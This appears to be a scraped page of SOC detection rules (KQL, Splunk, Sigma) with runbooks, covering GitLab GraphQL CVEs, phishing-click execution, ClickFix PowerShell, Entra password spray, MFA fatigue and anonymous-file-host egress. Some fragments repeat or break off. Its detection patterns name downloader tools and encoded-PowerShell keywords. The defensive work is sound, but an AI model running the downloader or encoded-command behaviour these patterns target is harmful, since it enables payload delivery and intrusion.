| where UserAgent !has "GraphiQL" and Url !has "__schema" and Url !has "IntrospectionQuery"
Response runbook
1) TRIAGE: Pull the full request from proxy logs — confirm method=GET, the URL contains an actual `mutation {` operation (not just the token 'mutation'), and note the source IP, user-agent, and HTTP status. A 200/302 on a GET mutation from an unauthenticated/external IP is high-signal. 2) CONTAIN: If confirmed, block the source IP at the WAF/reverse proxy, and verify the GitLab instance is patched to 19.2.4 / 19.1.6 / 19.0.8 / 18.11.11; if not, restrict /api/graphql to authenticated origins and expedite the upgrade. 3) HUNT: Review GitLab audit and application logs for project/user modify or delete events with a blank or unexpected actor around the request time, and pivot on the source IP across all GitLab endpoints for reconnaissance.
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "GET"
| where Url has "/api/graphql"
| where Url has "mutation" or Url has "_json"
| where isempty(tostring(HttpStatusCode)) or toint(HttpStatusCode) < 400   // successful or unlogged-status GET mutations
| project TimeGenerated, SrcIpAddr, DstHostname, DstIpAddr, HttpMethod, Url, HttpStatusCode, UserAgent = HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Self-managed GitLab running versions vulnerable to CVE-2026-19478 / CVE-2026-19650 AIReconnaissance High
Surfaces managed hosts whose Defender TVM software inventory flags GitLab CE/EE as vulnerable to the critical GraphQL directive flaw (CVE-2026-19478) or the CSRF multiplex-handler flaw (CVE-2026-19650), so exposure can be prioritised and closed before exploitation. Article-specific because it keys on the exact CVE IDs and the self-managed-only scope the advisory calls out. Rationale: Maps the advisory's named CVE IDs directly to Defender TVM inventory and enriches with IsInternetFacing, matching GitLab's own guidance that only self-managed (especially internet-facing) instances need to act. Zero payload guessing — it is a clean exposure/patch-status hunt. Cross-checked against: • https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-2-4-released/ • https://cyberpress.org/gitlab-critical-vulnerability/
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Host already patched to 19.2.4 / 19.1.6 / 19.0.8 / 18.11.11 but TVM inventory not yet refreshed (transient false positive until next scan)
  • GitLab.com SaaS runners or GitLab Dedicated hosts that TVM sees but that are vendor-managed and already patched
  • Air-gapped / internal-only GitLab instances flagged as vulnerable but not reachable by an unauthenticated external attacker
  • Decommissioned GitLab servers still present in stale inventory
Response runbook
1) TRIAGE: Rank hits by IsInternetFacing and by whether the instance hosts public projects — these are the exploitable population for the unauthenticated CVE-2026-19478. Confirm the installed GitLab version against the fixed builds (19.2.4 / 19.1.6 / 19.0.8 / 18.11.11). 2) CONTAIN: For any internet-facing vulnerable instance, restrict external access to /api/graphql at the proxy/WAF and schedule the emergency upgrade (no migrations, no downtime per GitLab). 3) HUNT: On each vulnerable host, review web logs for prior GET requests to /api/graphql carrying mutations (see companion UC) and audit logs for unexplained project/user deletions to rule out pre-patch exploitation.
DeviceTvmSoftwareVulnerabilities

| join kind=leftouter (DeviceInfo | summarize arg_max(Timestamp, IsInternetFacing, PublicIP) by DeviceId) on DeviceId
| project DeviceName, DeviceId, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, IsInternetFacing, PublicIP
| order by IsInternetFacing desc, DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where CveId in ("CVE-2026-19478", "CVE-2026-19650")

| project TimeGenerated, DeviceName, DeviceId, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by DeviceName asc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores

status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies

references:

level: high

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Browser-pasted PowerShell launched from explorer/Run dialog — ClickFix social engineering.
ATT&CKT1204.004 T1059.001
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)

   or ParentProcessName endswith "\RuntimeBroker.exe"
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\pwsh.exe"
   or NewProcessName endswith "\mshta.exe"
| where CommandLine matches regex @"(?i)(iex|invoke-expression|frombase64|downloadstring|hxxp|curl |wget )"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Entra ID password spray: many distinct accounts failing auth from few source IPs · [LLM] Entra ID MFA fatigue: burst of MFA-challenge failures followed by a successful MFA sign-in · Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] First-time Entra directory enumeration via Graph/PowerShell CLI tooling by a user · [LLM] Endpoint egress/DNS to anonfilesnew.com anonymous file host (TheHatman sample staging)
Entra ID password spray: many distinct accounts failing auth from few source IPs AIExploitation High
Hunts the password-spray vector TheHatman used against Fortune 500 Entra tenants (per TCS's confirmation): a high count of distinct usernames hitting AADSTS50126 (invalid credential) from one or a few source IPs in a short window. Article-specific because it targets the exact pre-auth failure fan-out that precedes the compromised-credential Azure dumps. Rationale: Uses the exact vector TCS publicly confirmed (password spray). Distinct-user fan-out from a single IP with AADSTS50126 is the canonical spray signature and separates spraying (broad, shallow) from a single locked-out account. Cross-checked against: • https://www.theregister.com/security/2026/08/17/crook_hawks_millions_of_records/ • https://www.techzine.eu/news/security/143668/hacker-sells-mcdonalds-and-vodafone-records-stolen-from-azure/ • https://learn.microsoft.com/en-us/entra/identity/monitoring-health/howto-troubleshoot-sign-in-errors
ATT&CKT1110.003 T1078.004
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A corporate VPN/proxy egress IP concentrating many users so failed logons appear to come from one source
  • A misconfigured service/app pushing stale cached passwords for many mailboxes after a bulk password reset
  • A pen-test or authorised red-team spray exercise
  • A branch office behind a single NAT where several users mistype passwords Monday morning
  • Legacy IMAP/SMTP client after a domain-wide password rotation
Suppression filter
| where FailedUsers >= 20 and (Attempts * 1.0 / FailedUsers) < 5   // spray = shallow per-account; excludes single-account lockout storms
Response runbook
1) Triage: pivot on the source IP — confirm it is not a known corporate egress/VPN gateway (check ASN/geo), and list the distinct accounts targeted and whether any later succeeded (ResultType 0). 2) Contain: if any targeted account then succeeded from the same IP, revoke its refresh tokens, force password reset, and block the source IP at Conditional Access. 3) Hunt: search for subsequent successful sign-ins from that IP, MFA-fatigue bursts (see MFA UC), and any Microsoft Graph / directory-enumeration activity by the impacted accounts.
AADSignInEventsBeta
| where Timestamp > ago(1h)
| where ErrorCode == 50126   // invalid username or password
| summarize FailedUsers = dcount(AccountUpn), Attempts = count(), SampleUsers = make_set(AccountUpn, 50) by IPAddress, Application, bin(Timestamp, 30m)
| where FailedUsers >= 20     // 20 = spray breadth threshold (few passwords, many accounts)
| order by FailedUsers desc
SigninLogs
| where TimeGenerated > ago(1h)
| where ResultType == "50126"   // invalid username or password
| summarize FailedUsers = dcount(UserPrincipalName), Attempts = count(), SampleUsers = make_set(UserPrincipalName, 50) by IPAddress, AppDisplayName, bin(TimeGenerated, 30m)
| where FailedUsers >= 20        // 20 = spray breadth threshold
| order by FailedUsers desc
source:azure.activeDirectory @evt.name:"Sign-in activity" @properties.status.errorCode:50126
CLOUD
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true dc(Authentication.user) as failed_users count as attempts from datamodel=Authentication where Authentication.action=failure AND Authentication.signature_id=50126 by Authentication.src Authentication.app _time span=30m
| `drop_dm_object_name(Authentication)`
| where failed_users >= 20
| sort - failed_users
| tstats summariesonly=false dc(Authentication.user) as failed_users count as attempts from datamodel=Authentication where Authentication.action=failure AND Authentication.signature_id=50126 by Authentication.src Authentication.app _time span=30m
| `drop_dm_object_name(Authentication)`
| where failed_users >= 20
| sort - failed_users
Entra ID MFA fatigue: burst of MFA-challenge failures followed by a successful MFA sign-in AIExploitation High
Hunts the MFA-fatigue (push-bombing) technique TheHatman used alongside password spray: a single user receives a burst of MFA-challenge failures (AADSTS 50074/50076/50088/50158) and then an MFA-satisfied success — the user finally approving a prompt. Article-specific because it correlates the exact fatigue pattern into an accepted authentication that yields the compromised Azure credentials. Rationale: Codes 50074/50076/50088/50158 are the documented MFA-challenge/fatigue failure results; requiring >=5 in a burst then an MFA-satisfied success captures the moment the fatigued user approves, which is the exact TCS-named vector. Cross-checked against: • https://learn.microsoft.com/en-us/entra/identity/monitoring-health/howto-troubleshoot-sign-in-errors • https://x.com/Kostastsale/status/1730759030803747228 • https://www.govinfosecurity.com/azure-breach-campaign-claims-mcdonalds-vodafone-as-victims-a-32578
ATT&CKT1621 T1078.004
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A user with a flaky phone/authenticator repeatedly failing and re-triggering MFA before finally succeeding
  • Poor cellular coverage causing telecom MFA call limit (50088) then a retry that works
  • A newly enrolled device where the user fumbles the first several prompts
  • Time-skew or token-cache issues on a corporate laptop generating rapid re-prompts
  • Shared kiosk/hot-desk sign-ins where several attempts precede success
Suppression filter
| where SuccessIP != PromptIP   // fatigue-that-worked usually shows the attacker's prompt IP differing from the eventual success context
Response runbook
1) Triage: compare PromptIP vs SuccessIP and the user's normal geo/device — a foreign/hosting-ASN prompt IP with a burst then success is high-fidelity fatigue. 2) Contain: revoke the user's sessions/refresh tokens, force re-registration of MFA, and require password reset; temporarily raise Conditional Access to number-matching/phishing-resistant MFA. 3) Hunt: check whether the same account then signed into Microsoft Graph / directory tooling (see enumeration UC) and whether the prompt IP also drove the password spray.
let Window = 2h;
let Fatigue = AADSignInEventsBeta
    | where Timestamp > ago(Window)
    | where ErrorCode in (50074, 50076, 50088, 50158)   // MFA challenge failed / required / telecom-limit / ext-security-challenge not satisfied
    | summarize MfaPrompts = count(), FirstPrompt = min(Timestamp), LastPrompt = max(Timestamp) by AccountUpn, IPAddress
    | where MfaPrompts >= 5;   // 5 = push-bombing burst floor
AADSignInEventsBeta
| where Timestamp > ago(Window)
| where ErrorCode == 0
| where AuthenticationRequirement == "multiFactorAuthentication"
| join kind=inner Fatigue on AccountUpn
| where Timestamp between (FirstPrompt .. LastPrompt + 30m)
| project SuccessTime = Timestamp, AccountUpn, SuccessIP = IPAddress, PromptIP = IPAddress1, MfaPrompts, FirstPrompt, LastPrompt, Application
| order by MfaPrompts desc
let Window = 2h;
let Fatigue = SigninLogs
    | where TimeGenerated > ago(Window)
    | where ResultType in ("50074","50076","50088","50158")
    | summarize MfaPrompts = count(), FirstPrompt = min(TimeGenerated), LastPrompt = max(TimeGenerated) by UserPrincipalName, IPAddress
    | where MfaPrompts >= 5;   // 5 = push-bombing burst floor
SigninLogs
| where TimeGenerated > ago(Window)
| where ResultType == "0"
| where AuthenticationRequirement == "multiFactorAuthentication"
| join kind=inner Fatigue on UserPrincipalName
| where TimeGenerated between (FirstPrompt .. LastPrompt + 30m)
| project SuccessTime = TimeGenerated, UserPrincipalName, SuccessIP = IPAddress, PromptIP = IPAddress1, MfaPrompts, FirstPrompt, LastPrompt, AppDisplayName
| order by MfaPrompts desc
source:azure.activeDirectory @evt.name:"Sign-in activity" (@properties.status.errorCode:50074 OR @properties.status.errorCode:50076 OR @properties.status.errorCode:50088 OR @properties.status.errorCode:50158)
CLOUD

| tstats summariesonly=true count from datamodel=Authentication where Authentication.signature_id IN (50074,50076,50088,50158) by Authentication.user Authentication.src _time span=15m
| `drop_dm_object_name(Authentication)`
| where count >= 5
| sort - count
| tstats summariesonly=false count from datamodel=Authentication where Authentication.signature_id IN (50074,50076,50088,50158) by Authentication.user Authentication.src _time span=15m
| `drop_dm_object_name(Authentication)`
| where count >= 5
| sort - count
First-time Entra directory enumeration via Graph/PowerShell CLI tooling by a user AIActions on Objectives Medium
Hunts the exfiltration stage TheHatman described as 'downloaded directly from Azure Tenant': after credential compromise, an account signs into Microsoft Graph / Azure PowerShell / Graph command-line tooling for the FIRST time (30-day anti-join baseline) to bulk-read directory objects (users, service accounts, global admins). Article-specific because the leaks contained full tenant directory attributes and .onmicrosoft.com structures indicative of a Graph directory pull. Rationale: Hudson Rock confirmed the dumps contain foundational directory attributes, service accounts and global-admin names with .onmicrosoft.com structure — that shape comes from a Graph/AzureAD directory read. First-time CLI-tooling sign-in per user surfaces the enumeration onset without alerting on routine admin use. Cross-checked against: • https://www.bleepingcomputer.com/news/security/hacker-claims-36-million-azure-account-records-stolen-from-major-companies/ • https://cybernews.com/security/mcdonalds-vodafone-azure-microdoft-credential-theft/
ATT&CKT1087.004 T1526 T1078.004
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • An IT admin using Microsoft Graph PowerShell for the first time on a new laptop
  • A new hire in the identity team onboarding to Az CLI / Graph tooling
  • A one-off automation/service account run migrated to Graph SDK
  • Security tooling (CSPM/IGA) enrolling a new app registration that authenticates as a user
  • A developer testing Graph Explorer against production tenant
Response runbook
1) Triage: confirm whether the user is a legitimate admin and whether the sign-in IP/geo matches their norm; check if the same account appeared in the password-spray or MFA-fatigue UCs. 2) Contain: if the account is non-admin or the IP is a hosting/foreign ASN, revoke tokens, disable the account, and review Conditional Access to block Graph tooling for non-privileged users. 3) Hunt: pull AuditLogs/Graph activity for bulk user-object reads by that principal, enumerate what directory scope the token held, and check for outbound staging to anonymous file hosts.
let Baseline = AADSignInEventsBeta
    | where Timestamp between (ago(30d) .. ago(1d))
    | where Application in ("Microsoft Graph Command Line Tools","Azure Active Directory PowerShell","Microsoft Azure PowerShell","Graph Explorer","Azure CLI")
    | distinct AccountUpn, Application;
AADSignInEventsBeta
| where Timestamp > ago(1d)
| where ErrorCode == 0
| where Application in ("Microsoft Graph Command Line Tools","Azure Active Directory PowerShell","Microsoft Azure PowerShell","Graph Explorer","Azure CLI")
| join kind=leftanti Baseline on AccountUpn, Application
| project Timestamp, AccountUpn, Application, IPAddress, ResourceDisplayName, ClientAppUsed, Country
| order by Timestamp desc
let Baseline = SigninLogs
    | where TimeGenerated between (ago(30d) .. ago(1d))
    | where AppDisplayName in ("Microsoft Graph Command Line Tools","Azure Active Directory PowerShell","Microsoft Azure PowerShell","Graph Explorer","Azure CLI")
    | distinct UserPrincipalName, AppDisplayName;
SigninLogs
| where TimeGenerated > ago(1d)
| where ResultType == "0"
| where AppDisplayName in ("Microsoft Graph Command Line Tools","Azure Active Directory PowerShell","Microsoft Azure PowerShell","Graph Explorer","Azure CLI")
| join kind=leftanti Baseline on UserPrincipalName, AppDisplayName
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, ResourceDisplayName, ClientAppUsed, Location
| order by TimeGenerated desc
source:azure.activeDirectory @evt.name:"Sign-in activity" (@properties.appDisplayName:"Microsoft Graph Command Line Tools" OR @properties.appDisplayName:"Azure Active Directory PowerShell" OR @properties.appDisplayName:"Microsoft Azure PowerShell" OR @properties.appDisplayName:"Graph Explorer" OR @properties.appDisplayName:"Azure CLI")
CLOUD
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count values(Authentication.src) as src from datamodel=Authentication where Authentication.action=success AND (Authentication.app="Microsoft Graph Command Line Tools" OR Authentication.app="Azure Active Directory PowerShell" OR Authentication.app="Microsoft Azure PowerShell" OR Authentication.app="Graph Explorer" OR Authentication.app="Azure CLI") by Authentication.user Authentication.app
| `drop_dm_object_name(Authentication)`

Endpoint egress/DNS to anonfilesnew.com anonymous file host (TheHatman sample staging) AIActions on Objectives Low
Hunts corporate endpoints resolving or connecting to anonfilesnew.com, the anonymous file-sharing domain tied to the TheHatman Azure/Entra data-sale campaign where dumps and buyer samples were posted. Article-specific because it pivots on the single hard network IOC extracted from the campaign coverage. Rationale: anonfilesnew.com is the only concrete IOC in the campaign reporting; endpoint DNS/egress to an anonymous file host is a legitimate exfil-staging hunt and gives a network pivot distinct from the identity-plane UCs. Cross-checked against: • https://www.bleepingcomputer.com/news/security/hacker-claims-36-million-azure-account-records-stolen-from-major-companies/
ATT&CKT1567
Data sourcesNetwork_Resolution.DNS Web.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • An employee legitimately downloading a shared file from an anonymous file host
  • Threat-intel/researcher workstation visiting the domain to collect samples
  • Security appliance sandbox detonating a URL that resolves the domain
  • A user clicking a marketing/forum link that redirects through the host
  • Automated URL-reputation crawlers on a proxy
Suppression filter
| where InitiatingProcessFileName in~ ("powershell.exe","pwsh.exe","curl.exe","bitsadmin.exe","certutil.exe","cmd.exe")   // narrow Defender hits to non-browser initiators (drop for pure browsing FP reduction)
Response runbook
1) Triage: identify the initiating process and user on the endpoint — browser vs. scripting/LOLBin (curl.exe, powershell.exe) heavily changes severity; check bytes/direction. 2) Contain: if a non-browser process or a user tied to a compromised Entra account initiated it, isolate the host and block anonfilesnew.com at the proxy/DNS. 3) Hunt: review that user's Entra sign-ins for the spray/MFA-fatigue/Graph-enumeration UCs, and search for large local staging (archive creation) preceding the connection.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "anonfilesnew.com"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
ImDnsActivity
| where TimeGenerated > ago(30d)
| where DnsQuery has "anonfilesnew.com"
| project TimeGenerated, SrcIpAddr, DvcHostname, SrcUsername, DnsQuery, DnsResponseName
| order by TimeGenerated desc
title: DNS Query to anonfilesnew.com Anonymous File Host (TheHatman Azure Data-Sale Campaign)
id: 3f9c1e2a-7b4d-4c8e-9a1f-2d6b8c0e5a11
status: experimental
description: Detects DNS resolution of anonfilesnew.com, the anonymous file host tied to the TheHatman Azure/Entra employee-data sale campaign, potentially indicating exfil staging or sample retrieval.
references:

author: SOC Detection Engineering

logsource:
  category: dns
detection:
  selection:
    QueryName|endswith: 'anonfilesnew.com'
  condition: selection
falsepositives:

level: medium
(source:windows.sysmon OR source:windows.defender) @DestinationHostname:(*anonfilesnew.com* OR *AnonFilesNew.com* OR *ANONFILESNEW.COM*)
#event_simpleName=DnsRequest DomainName=/anonfilesnew\.com$/i
| groupBy([aid, ComputerName, DomainName, ContextImageFileName], function=count())
CLOUD
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count from datamodel=Network_Resolution where Network_Resolution.query="*anonfilesnew.com*" by Network_Resolution.src Network_Resolution.query _time span=1h
| `drop_dm_object_name(Network_Resolution)`

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user

The issue was present in&nbsp;.github/workflows/jira_issue.yml, which ran when a

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
